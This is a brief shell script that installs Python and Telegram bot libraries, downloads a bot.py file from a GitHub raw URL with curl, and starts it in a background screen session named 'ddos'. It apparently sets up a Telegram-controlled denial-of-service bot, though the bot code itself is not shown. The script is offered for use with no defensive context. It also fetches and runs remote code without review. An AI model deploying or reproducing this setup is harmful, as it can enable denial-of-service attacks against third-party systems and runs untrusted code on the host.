yum update -y && apt update -y
yum install python3 -y && apt install python3 -y
pip3 install telegram
pip3 install psutil
pip3 install python-telegram-bot==13.7
pip3 install bs4
pip3 install requests
mkdir bot && cd bot
curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/bot.py -o bot.py
screen -dmS ddos python3 bot.py
